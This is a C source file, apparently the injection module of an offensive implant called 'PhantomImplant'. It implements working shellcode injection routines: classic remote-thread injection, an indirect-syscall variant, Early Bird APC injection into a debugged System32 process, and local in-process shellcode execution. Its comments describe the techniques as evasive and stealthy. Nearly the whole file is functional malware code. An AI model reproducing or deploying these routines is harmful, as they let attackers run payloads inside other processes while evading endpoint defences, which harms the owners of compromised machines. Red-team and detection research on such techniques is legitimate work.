/**
 * PhantomImplant - Injection Module
 *
 * Multiple injection techniques:
 *   1. Classic remote injection (WinAPI - simple but detectable)
 *   2. Classic remote injection via indirect syscalls (evasive)
 *   3. Early Bird APC injection (stealthy - suspended/debugged process)
 *   4. Local execution (current process, WinAPI and syscall variants)
 *
 * Based on: MalDev Academy Modules 27, 29, 40
 */

#include "injection.h"
#include "syscalls.h"
#include <tlhelp32.h>
#include <stdio.h>

// External syscall table (from syscalls.c)
extern NTAPI_FUNC g_Nt;

// =============================================
// Process enumeration - find PID and open handle by name
// =============================================
BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

    PROCESSENTRY32W Proc = { .dwSize = sizeof(PROCESSENTRY32W) };
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapShot == INVALID_HANDLE_VALUE)
        return FALSE;

    if (!Process32FirstW(hSnapShot, &Proc)) {
        CloseHandle(hSnapShot);
        return FALSE;
    }

    do {
        WCHAR LowerName[MAX_PATH * 2];
        DWORD dwSize = lstrlenW(Proc.szExeFile);

        if (dwSize < MAX_PATH * 2) {
            for (DWORD i = 0; i < dwSize; i++)
                LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
            LowerName[dwSize] = L'\0';

            if (wcscmp(LowerName, szProcessName) == 0) {
                *dwProcessId = Proc.th32ProcessID;
                *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
                break;
            }
        }
    } while (Process32NextW(hSnapShot, &Proc));

    CloseHandle(hSnapShot);
    return (*dwProcessId != 0 && *hProcess != NULL);
}

// =============================================
// Classic Remote Shellcode Injection (WinAPI)
// VirtualAllocEx -> WriteProcessMemory -> VirtualProtectEx -> CreateRemoteThread
// =============================================
BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode) {

    PVOID   pRemoteAddr     = NULL;
    SIZE_T  sBytesWritten   = 0;
    DWORD   dwOldProtection = 0;

    // Allocate RW memory in remote process
    pRemoteAddr = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteAddr)
        return FALSE;

    // Write shellcode to remote memory
    if (!WriteProcessMemory(hProcess, pRemoteAddr, pShellcode, sSizeOfShellcode, &sBytesWritten) || sBytesWritten != sSizeOfShellcode)
        return FALSE;

    // Zero local copy
    SecureZeroMemory(pShellcode, sSizeOfShellcode);

    // Change protection to RX
    if (!VirtualProtectEx(hProcess, pRemoteAddr, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection))
        return FALSE;

    // Execute via remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
    if (!hThread)
        return FALSE;

    CloseHandle(hThread);
    return TRUE;
}

// =============================================
// Classic Remote Injection via Indirect Syscalls
// NtAllocateVirtualMemory -> NtWriteVirtualMemory ->
// NtProtectVirtualMemory -> NtCreateThreadEx
// =============================================
BOOL InjectShellcodeSyscall(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode) {

    NTSTATUS status     = 0;
    PVOID    pRemoteAddr = NULL;
    SIZE_T   sSize       = sSizeOfShellcode;
    SIZE_T   sBytesWritten = 0;
    DWORD    dwOldProt   = 0;
    HANDLE   hThread     = NULL;

    // Allocate RW memory via syscall
    SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
    status = RunSyscall(hProcess, &pRemoteAddr, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0x00 || !pRemoteAddr)
        return FALSE;

    // Write shellcode via syscall
    SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
    status = RunSyscall(hProcess, pRemoteAddr, pShellcode, sSizeOfShellcode, &sBytesWritten);
    if (status != 0x00)
        return FALSE;

    // Zero local copy
    SecureZeroMemory(pShellcode, sSizeOfShellcode);

    // Change to RX via syscall
    sSize = sSizeOfShellcode;
    SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
    status = RunSyscall(hProcess, &pRemoteAddr, &sSize, PAGE_EXECUTE_READ, &dwOldProt);
    if (status != 0x00)
        return FALSE;

    // Execute via NtCreateThreadEx
    SET_SYSCALL(g_Nt.NtCreateThreadEx);
    status = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddr, NULL, FALSE, 0, 0, 0, NULL);
    if (status != 0x00 || !hThread)
        return FALSE;

    // Wait for execution
    SET_SYSCALL(g_Nt.NtWaitForSingleObject);
    RunSyscall(hThread, FALSE, NULL);

    // Cleanup
    SET_SYSCALL(g_Nt.NtClose);
    RunSyscall(hThread);

    return TRUE;
}

// =============================================
// Early Bird APC Injection
// Creates process with DEBUG_PROCESS flag,
// writes shellcode, queues APC, detaches debugger.
//
// Advantages:
//   - No CreateRemoteThread (heavily monitored)
//   - Process appears as debugged child (less suspicious)
//   - APC executes before any user code runs
// =============================================
BOOL EarlyBirdApcInject(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, IN LPCSTR lpTargetProcess) {

    CHAR                lpPath[MAX_PATH * 2]    = { 0 };
    CHAR                WnDr[MAX_PATH]          = { 0 };
    STARTUPINFOA        Si                      = { .cb = sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION Pi                      = { 0 };
    PVOID               pRemoteAddr             = NULL;
    SIZE_T              sBytesWritten           = 0;
    DWORD               dwOldProt               = 0;

    // Build target process path: C:\Windows\System32\<target>
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH))
        return FALSE;

    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpTargetProcess);

    // Create process in DEBUG state (paused at entry point)
    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi))
        return FALSE;

    // Allocate RW memory in the debugged process
    pRemoteAddr = VirtualAllocEx(Pi.hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteAddr)
        goto _Fail;

    // Write shellcode
    if (!WriteProcessMemory(Pi.hProcess, pRemoteAddr, pShellcode, sSizeOfShellcode, &sBytesWritten))
        goto _Fail;

    // Zero local copy
    SecureZeroMemory(pShellcode, sSizeOfShellcode);

    // Change to RX
    if (!VirtualProtectEx(Pi.hProcess, pRemoteAddr, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProt))
        goto _Fail;

    // Queue APC to the suspended main thread
    if (!QueueUserAPC((PAPCFUNC)pRemoteAddr, Pi.hThread, 0))
        goto _Fail;

    // Detach debugger -> resumes thread -> APC executes
    DebugActiveProcessStop(Pi.dwProcessId);

    CloseHandle(Pi.hProcess);
    CloseHandle(Pi.hThread);
    return TRUE;

_Fail:
    TerminateProcess(Pi.hProcess, 0);
    CloseHandle(Pi.hProcess);
    CloseHandle(Pi.hThread);
    return FALSE;
}

// =============================================
// Local Shellcode Execution (WinAPI)
// For in-process payload execution
// =============================================
BOOL LocalShellcodeExec(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode) {

    PVOID   pAddr    = NULL;
    DWORD   dwOld    = 0;
    HANDLE  hThread  = NULL;

    pAddr = VirtualAlloc(NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pAddr)
        return FALSE;

    memcpy(pAddr, pShellcode, sSizeOfShellcode);
    SecureZeroMemory(pShellcode, sSizeOfShellcode);

    if (!VirtualProtect(pAddr, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOld))
        return FALSE;

    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pAddr, NULL, 0, NULL);
    if (!hThread)
        return FALSE;

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return TRUE;
}

// =============================================
// Local Shellcode Execution via Indirect Syscalls
// Most evasive local execution method
// =============================================
BOOL LocalShellcodeExecSyscall(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode) {

    NTSTATUS status     = 0;
    PVOID    pAddr      = NULL;
    SIZE_T   sSize      = sSizeOfShellcode;
    DWORD    dwOld      = 0;
    HANDLE   hThread    = NULL;
    HANDLE   hProcess   = (HANDLE)-1;  // current process pseudo-handle

    // Allocate RW
    SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
    status = RunSyscall(hProcess, &pAddr, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0x00 || !pAddr)
        return FALSE;

    // Copy shellcode
    memcpy(pAddr, pShellcode, sSizeOfShellcode);
    SecureZeroMemory(pShellcode, sSizeOfShellcode);

    // Change to RX
    sSize = sSizeOfShellcode;
    SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
    status = RunSyscall(hProcess, &pAddr, &sSize, PAGE_EXECUTE_READ, &dwOld);
    if (status != 0x00)
        return FALSE;

    // Execute
    SET_SYSCALL(g_Nt.NtCreateThreadEx);
    status = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddr, NULL, FALSE, 0, 0, 0, NULL);
    if (status != 0x00 || !hThread)
        return FALSE;

    // Wait
    SET_SYSCALL(g_Nt.NtWaitForSingleObject);
    RunSyscall(hThread, FALSE, NULL);

    SET_SYSCALL(g_Nt.NtClose);
    RunSyscall(hThread);

    return TRUE;
}
